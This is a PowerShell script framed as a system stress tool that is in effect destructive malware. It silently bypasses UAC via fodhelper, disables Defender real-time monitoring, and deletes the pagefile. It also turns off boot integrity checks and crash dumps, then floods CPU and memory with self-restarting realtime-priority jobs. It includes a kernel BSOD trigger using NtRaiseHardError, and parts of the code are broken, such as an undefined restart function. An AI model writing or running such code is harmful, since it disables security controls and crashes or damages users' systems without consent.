# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}
Import-Module ThreadJob -Force
try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
# --- System Tweaks to maximize resource pressure ---
Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 0.9) # 90% of physical RAM

# Chunk size between 700MB and 999MB (start at 700MB)
$minChunkSize = 0.7GB
$maxChunkSize = 1.5GB

# Number of CPU cores
$threads = [Environment]::ProcessorCount

# List to hold job objects
$jobs = [System.Collections.ArrayList]::new()

# Add-Type block to import native NT functions for BSOD trigger
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@

# Kernel-level BSOD trigger function
function Invoke-KernelBSOD {
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}


# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $targetSize)

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # Set process priority to Realtime (aggressive)
    $proc = Get-Process -Id $PID
    try {
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # Set process affinity to all cores
    try {
        $proc.ProcessorAffinity = -1
    } catch {}

    # CPU Stress function with multiple CPU intensive tasks
    function Stress-CPU {
        param([int]$iterations)
        $numThreads = 3
        # Random data buffer
        $data = [byte[]]::new(8192)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)

        # SHA512 hashing loop
        1..$numThreads | ForEach-Object{
            $sha512Thread = [System.Threading.Thread]::new({
                param($iterations, $data)
                $sha512 = [System.Security.Cryptography.SHA512]::Create()
                1..$iterations | ForEach-Object {
                    $data = $sha512.ComputeHash($data)
                }
            })
            $sha512Thread.Priority = [System.Threading.ThreadPriority]::Highest
            $sha512Thread.IsBackground = $true
            $sha512Thread.Start($iterations, $data)
        }

        # Large prime factorization (CPU heavy)
        1..$numThreads | ForEach-Object{
            $primeFactorizeThread = [System.Threading.Thread]::new({
                param($n)
                function Get-Primes {
                    param($n)
                    $factors = @()
                    for ($i = 2; $i -le $n; $i++) {
                        while ($n % $i -eq 0) {
                            $factors += $i
                            $n = [math]::Floor($n / $i)
                        }
                    }
                    return $factors
                }
                Get-Primes $n | Out-Null
            })
            $primeFactorizeThread.Priority = [System.Threading.ThreadPriority]::Highest
            $number = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
            $primeFactorizeThread.IsBackground = $true
            $primeFactorizeThread.Start($number)
        }

        # Matrix multiplication stress 
        $size = 2147483647
        1..$numThreads | ForEach-Object{
            $matrixMulThread = [System.Threading.Thread]::new({
                param($size)
                $A = @(); $B = @(); $C = @()
                0..($size-1) | ForEach-Object {
                    $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                    $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                    $C += ,@(0..($size-1) | ForEach-Object { 0 })
                }
                0..($size-1) | ForEach-Object { $i = $_
                    0..($size-1) | ForEach-Object { $j = $_
                        $sum = 0
                        0..($size-1) | ForEach-Object { $k = $_
                            $sum += ($A[$i][$k] * $B[$k][$j])
                        }
                        $C[$i][$j] = $sum
                    }
                }
            })
            $matrixMulThread.Priority = [System.Threading.ThreadPriority]::Highest
            $matrixMulThread.IsBackground = $true
            $matrixMulThread.Start($size)
        }
    }

    # Memory Stress function progressively allocating chunks
    function Stress-MemoryProgressive {
        param(
            [int64]$minChunkSize,
            [int64]$maxChunkSize,
            [int64]$targetSize
        )
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minChunkSize

        while ($true) {
            if ($allocated -ge $targetSize) {
                # Hold memory indefinitely
                Start-Sleep -Seconds 60
                continue
            }
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = [math]::Min($chunkSize + 0.512GB, $maxChunkSize)
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
            } catch {
                # Allocation failed, hold memory and retry after short pause
                Start-Sleep -Seconds 5
            }
        }
    }

    # Start memory stress in background thread
    1..$numThreads | ForEach-Object{
        $memThread = [System.Threading.Thread]::new({
            param($minCS, $maxCS, $target)
            Stress-MemoryProgressive $minCS $maxCS $target
        })
        $memThread.Priority = [System.Threading.ThreadPriority]::Highest
        $memThread.IsBackground = $true
        $memThread.Start($minChunkSize, $maxChunkSize, $targetSize)
    }

    # CPU stress loop with progressive load increase
    $iterations = 1_000_000
    while ($true) {
        try {
            Stress-CPU -iterations $iterations
        } catch {}

        Write-Progress -Activity "Job $jobIndex CPU Stress" -Status "Iterations: $iterations"
        Start-Sleep -Milliseconds 200

        if ($iterations -lt 10000000) {
            $iterations += 500000
        }
    }
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    $job = Start-Job -ScriptBlock $jobScript -ArgumentList $i, $minChunkSize, $maxChunkSize, $targetSize
    $job | Add-Member -NotePropertyName RetryCount -NotePropertyValue 0
    $jobs.Add($job)
}

Write-Host "Started $threads stress jobs with high priority."

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# Optional: Wait some time before triggering BSOD (adjust delay as needed)
# $bsodDelaySeconds = 180
# Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
# $elapsedTime = 0

# while ($elapsedTime -lt $bsodDelaySeconds) {
#     Start-Sleep -Seconds 1
#     $elapsedTime++
#     Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
#     foreach ($job in $jobs) {
#         if ($job.State -ne 'Running') {
#             Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
#             Remove-Job -Job $job -Force
#             $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
#             $jobs += $newJob
#         }
#     }
# }

# # Trigger BSOD
# Invoke-KernelBSOD

# --- Monitor jobs and restart if any stop ---
while ($true) {
    Start-Sleep -Seconds 5
    $currentJobs = @($jobs)
    foreach ($job in $currentJobs) {
        if ($job.State -ne 'Running') {
            if ($job.RetryCount -ge 5) {
                Write-Warning "Job $($job.Id) failed 5 times. Removing."
                $jobs.Remove($job) | Out-Null
                continue
            }
            Write-Warning "Job $($job.Id) stopped. Restarting..."
            Remove-Job -Job $job -Force
            $jobs.Remove($job) | Out-Null
            Start-StressJob -index $job.Id
            $newJob = $jobs | Where-Object { $_.Id -eq $job.Id }
            if ($newJob) { $newJob.RetryCount = $job.RetryCount + 1 }
        }
    }
}

# Cleanup (never reached unless script forcibly stopped)
$jobs | ForEach-Object {
    Stop-Job -Job $_ -Force
    Remove-Job -Job $_ -Force
}